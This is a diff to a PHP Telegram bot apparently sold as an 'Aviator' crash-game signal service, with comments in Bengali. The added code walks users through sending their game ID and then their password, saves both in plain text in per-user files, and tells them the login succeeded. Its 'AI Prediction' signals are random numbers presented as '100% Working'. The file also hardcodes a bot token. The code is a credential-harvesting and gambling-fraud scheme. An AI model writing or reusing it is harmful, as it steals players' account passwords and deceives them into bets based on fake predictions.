@@ -3,51 +3,77 @@ header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Headers: Content-Type");
 header("Content-Type: application/json");
 
-// কনফিগারেশন
+// --- কনফিগারেশন ---
 $botToken = "8261050495:AAGoLFT2SZgf0HWCiG9Q_g9-HhD362Qr6z4";
-$chatId = "6109947429"; // এখানে আপনার আসল ID দিন (যেমন: 12345678)
+$chatId = "6109947429"; // এখানে আপনার আসল আইডিটি দিন
+$ownerName = "R8rAIHAN";
+// -----------------
 
 $input = file_get_contents('php://input');
 $data = json_decode($input, true);
 
-// সিগন্যাল প্রসেসিং
-if (isset($data['multiplier'])) {
-    $last = floatval($data['multiplier']);
-    
-    // সিগন্যাল আসার আগে অবশ্যই লগইন চেক করবে
-    if (file_exists('user_session.json')) {
-        $prediction = ($last < 1.8) ? rand(250, 600)/100 : rand(110, 210)/100;
-        
-        $msg = "🚀 **NEW SIGNAL (LIVE)** 🚀\n";
-        $msg .= "----------------------------\n";
-        $msg .= "📊 Last Round: " . $last . "x\n";
-        $msg .= "🎯 Prediction: " . round($prediction, 2) . "x\n";
-        $msg .= "💰 Safe Cashout: " . round($prediction * 0.85, 2) . "x\n";
-        $msg .= "✅ Status: Working 100%";
+if (isset($data['message'])) {
+    $text = $data['message']['text'] ?? '';
+    $uId = $data['message']['chat']['id'];
+    $stepFile = "step_$uId.txt";
 
-        $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
-        file_get_contents($url);
-        
-        echo json_encode(["status" => "signal_sent"]);
-    } else {
-        echo json_encode(["status" => "login_required"]);
+    // ১. স্টার্ট কমান্ড
+    if ($text == "/start") {
+        $msg = "🚀 **Welcome to R8rAIHAN Aviator Bot** 🚀\n\n✅ **Status:** Bot Work 100% ✅\n\nসার্ভার রিড করার জন্য আপনার গেম আইডি দিন।\n\n👉 **1: Send Your Game ID / Number:**";
+        file_put_contents($stepFile, "waiting_id");
+        sendTelegram($botToken, $uId, $msg);
+        exit;
+    }
+
+    // ২. আইডি পাওয়ার পর পাসওয়ার্ড চাওয়া
+    $currentStep = file_exists($stepFile) ? file_get_contents($stepFile) : "";
+
+    if ($currentStep == "waiting_id") {
+        file_put_contents("user_data_$uId.json", json_encode(['id' => $text]));
+        file_put_contents($stepFile, "waiting_pw");
+        sendTelegram($botToken, $uId, "✅ ID Received!\n\n👉 **2: Send Your Game Password:**");
+        exit;
+    }
+
+    // ৩. পাসওয়ার্ড পাওয়ার পর সাকসেস মেসেজ
+    if ($currentStep == "waiting_pw") {
+        $userData = json_decode(file_get_contents("user_data_$uId.json"), true);
+        $userData['password'] = $text;
+        $userData['auth'] = true;
+        file_put_contents("user_data_$uId.json", json_encode($userData));
+        unlink($stepFile); // স্টেপ ডিলিট
+
+        $success = "✅ **Login Successful!**\n\nআপনার আইডি সার্ভারের সাথে কানেক্ট হয়েছে। এখন থেকে আপনি অটোমেটিক প্রেডিকশন পাবেন। 📈";
+        sendTelegram($botToken, $uId, $success);
+        exit;
     }
 }
 
-// টেলিগ্রাম থেকে আসা /start কমান্ড হ্যান্ডেল
-if (isset($data['message'])) {
-    $text = $data['message']['text'];
-    $uChatId = $data['message']['chat']['id'];
+// ৪. সিগন্যাল পাঠানো (Extension থেকে আসা ডেটা)
+if (isset($data['multiplier'])) {
+    $lastVal = floatval($data['multiplier']);
     
-    if ($text == "/start") {
-        $welcome = "🚀 **Welcome to R8rAIHAN Aviator Bot**\n\nOwner: R8rAIHAN\nBot Work 100%✅\n\nসিগন্যাল পেতে আপনার গেম আইডি পাসওয়ার্ড দিয়ে লগইন মেসেজ দিন।";
-        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$uChatId&text=".urlencode($welcome)."&parse_mode=Markdown");
+    // চেক করা হচ্ছে ইউজার লগইন কমপ্লিট করেছে কি না
+    if (file_exists("user_data_$chatId.json")) {
+        $userData = json_decode(file_get_contents("user_data_$chatId.json"), true);
+        
+        if ($userData['auth'] == true) {
+            $pred = ($lastVal < 1.8) ? rand(240, 580)/100 : rand(110, 215)/100;
+            
+            $signal = "🎯 **NEW SIGNAL DETECTED**\n";
+            $signal .= "----------------------------\n";
+            $signal .= "📊 Last Round: " . $lastVal . "x\n";
+            $signal .= "🚀 **AI Prediction: " . round($pred, 2) . "x**\n";
+            $signal .= "💰 Safe Out: " . round($pred * 0.88, 2) . "x\n";
+            $signal .= "✅ Bot Status: 100% Working";
+
+            sendTelegram($botToken, $chatId, $signal);
+        }
     }
-    
-    // আইডি পাসওয়ার্ড সেভ করা
-    if (str_contains(strtolower($text), 'id') && str_contains(strtolower($text), 'password')) {
-        file_put_contents('user_session.json', json_encode(['auth' => true]));
-        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$uChatId&text=".urlencode("✅ Login Successful! এখন থেকে অটো সিগন্যাল পাবেন।"));
-    }
+}
+
+function sendTelegram($token, $chatId, $msg) {
+    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=".urlencode($msg)."&parse_mode=Markdown";
+    file_get_contents($url);
 }
 ?>
